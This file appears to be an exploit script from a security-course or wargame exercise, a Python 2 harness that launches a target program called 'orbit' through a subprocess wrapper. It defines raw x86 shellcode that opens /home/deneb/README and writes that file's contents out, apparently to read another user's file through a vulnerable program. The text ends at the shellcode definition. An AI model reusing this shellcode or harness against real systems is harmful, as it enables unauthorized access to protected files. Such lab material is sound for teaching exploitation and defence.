#!/usr/bin/env python2

from subprocess import *
import signal
import string

class ProgramInterface(object):
    def __init__(self, executable):
        self.executable = executable

    def start(self):
        self.program = Popen(self.executable, stdin=PIPE, stdout=PIPE)

    def recv(self, num_bytes):
        self.program.stdout.flush()
        return self.program.stdout.read(num_bytes)

    def recvline(self):
        output = ''
        while True:
            byte = self.recv(1)
            if byte == '\n': break
            output += byte
        return output

    def send(self, s):
        self.program.stdin.write(s)

    def end(self):
        self.program.stdin.close()
        return self.program.wait()

def timeout_error(signum, frame):
    raise OSError("Took too long to run! " +
            "You are probably trying to recv when there is no program output")

signal.signal(signal.SIGALRM, timeout_error)
signal.alarm(10)

p = ProgramInterface(['invoke', './orbit'])

SHELLCODE = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2" \
"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd" \
"\x80\x89\xc6\xeb\x06\xb0\x01\x31" \
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83" \
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd" \
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0" \
"\x04\xb3\x02\xb2\x01\xcd\x80\x83" \
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff" \
"\xff/home/deneb/README\x00"
